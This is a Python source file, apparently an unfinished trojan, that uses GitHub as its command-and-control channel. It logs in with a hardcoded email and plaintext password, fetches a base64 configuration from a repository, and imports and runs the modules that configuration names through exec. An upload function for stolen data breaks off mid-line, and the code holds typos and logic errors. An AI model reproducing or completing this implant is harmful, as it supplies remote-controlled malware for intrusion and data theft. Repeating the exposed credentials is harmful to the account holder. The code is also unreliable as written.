import json, base64, sys, time, imp, random
import threading, os
import queue

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_module = []
configured = False
task_queue = queue.Queue()


def connect_to_github():
    gh = login(username="asssassing6@gmail.com", password="mustafa0909250601")
    repo = gh.repository("asssassing6@gmail.com", "torjan")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, rep, branch = connect_to_github()
    tree = branch.commit.commit.tree.recures()

    for filename in tree.tree:

        if filepath in filename.path:
            print("found file path " + filepath)
            blob = rep.blob(filename.__json_data['sha'])
            return blob.content

        return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec("import %s " % task["module"])
        return config

def store_module_result(data):

    gh ,rep ,branch = connect_to_github()
    remot_path = "data/%s/%d.data"%
